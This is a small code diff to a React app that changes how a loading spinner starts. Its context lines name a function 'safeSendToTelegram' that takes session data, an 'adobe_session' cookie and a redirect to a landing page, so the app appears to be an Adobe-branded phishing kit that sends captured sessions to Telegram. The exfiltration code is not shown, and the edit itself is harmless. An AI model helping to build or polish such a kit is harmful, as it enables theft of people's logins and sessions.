@@ -27,7 +27,7 @@ const safeSendToTelegram = async (sessionData: any) => {
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
-  const [isLoading, setIsLoading] = useState(true);
+  const [isLoading, setIsLoading] = useState(false); // Changed to false to prevent initial spinner
   const navigate = useNavigate();
 
   // This effect is unchanged
@@ -55,7 +55,6 @@ function App() {
   // This effect handles the initial page load
   useEffect(() => {
     if (hasActiveSession) { navigate('/landing', { replace: true }); }
-    setIsLoading(false);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
